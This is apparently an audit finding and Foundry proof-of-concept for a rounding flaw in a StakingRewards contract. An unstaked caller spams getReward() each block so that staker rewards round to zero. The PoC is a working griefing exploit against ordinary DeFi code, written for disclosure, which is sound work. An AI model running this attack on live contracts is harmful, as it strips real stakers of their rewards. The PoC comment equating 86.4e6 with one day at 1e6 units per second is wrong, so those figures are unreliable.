### Title
Unprivileged reward-index spam permanently truncates staker rewards - (File: contracts/StakingRewards.sol)

### Summary
`StakingRewards.getReward()` updates the global reward timestamp even for an account with no stake. When `elapsed * rewardRate * 1e18 < _totalSupply`, the division in `rewardPerToken()` rounds to zero, and the update nevertheless advances `lastUpdateTime`, permanently discarding the accrued reward interval.

### Finding Description
`rewardPerToken()` calculates the incremental index as `elapsed * rewardRate * 1e18 / _totalSupply`. [1](#0-0)  The `updateReward` modifier stores that index and updates `lastUpdateTime`, with no minimum elapsed time or remainder carry-over. [2](#0-1)  `getReward()` is public, applies `updateReward(msg.sender)`, and does not require the caller to have any staking balance. [3](#0-2) 

An attacker can therefore call `getReward()` whenever the natural block-time increment is small enough that the numerator is below `_totalSupply`. Each call stores a zero reward-index increment while advancing `lastUpdateTime`, erasing the interval instead of preserving its fractional contribution.

### Impact Explanation
Stakers can lose substantially all rewards for an entire distribution period. The reward tokens remain in the contract as undistributed balance rather than being credited through `rewards[account]` or `rewardPerTokenStored`. For example, with `_totalSupply = 1e26`, a 12-second interval, and `rewardRate = 1e6` reward units per second, each update computes `12 * 1e6 * 1e18 / 1e26 = 0`; repeating this once per block leaves users with zero newly accrued rewards.

### Likelihood Explanation
The attack requires a low reward rate relative to total staked supply, which is plausible when the reward token has few decimals or a modest reward budget and the staking token has 18 decimals and a large supply. The attacker is unprivileged and does not need to stake, be whitelisted, or control a privileged role in `StakingRewards`; only gas expenditure and regular transaction inclusion are required.

### Recommendation
Accumulate the numerator remainder across updates, or update `lastUpdateTime` only when the computed reward-index increment is nonzero. A robust implementation should track `pendingRewardNumerator`, add `elapsed * rewardRate * 1e18`, divide it by `_totalSupply`, store the quotient in `rewardPerTokenStored`, and retain the modulo as the next numerator.

### Proof of Concept
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {StakingRewards} from "../contracts/StakingRewards.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract RewardIndexSpamTest is Test {
    address constant IDLE = 0x875773784Af8135eA0ef43b5a374AaD105c5D39e;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    StakingRewards stakingRewards;
    address distributor = makeAddr("distributor");
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function testSpamRewardUpdateTruncatesAccrual() public {
        vm.createSelectFork("mainnet", 19_462_710);

        stakingRewards = new StakingRewards();
        stakingRewards.initialize(
            distributor,
            USDC,
            IDLE,
            address(this),
            true
        );

        uint256 supply = 1e26;
        deal(IDLE, victim, supply);

        vm.startPrank(victim);
        IERC20(IDLE).approve(address(stakingRewards), supply);
        stakingRewards.stake(supply);
        vm.stopPrank();

        uint256 reward = 86.4e6; // 1e6 USDC units per second for one day.
        deal(USDC, distributor, reward);

        vm.startPrank(distributor);
        IERC20(USDC).approve(address(stakingRewards), reward);
        stakingRewards.depositReward(address(0), reward);
        vm.stopPrank();

        // Every 12-second block:
        // 12 * 1e6 * 1e18 / 1e26 == 0.
        for (uint256 i; i < 7_200; ++i) {
            vm.warp(block.timestamp + 12);
            vm.prank(attacker);
            stakingRewards.getReward(); // attacker has zero staked balance
        }

        assertEq(stakingRewards.rewardPerTokenStored(), 0);
        assertEq(stakingRewards.earned(victim), 0);
        assertEq(IERC20(USDC).balanceOf(address(stakingRewards)), reward);
    }
}
```
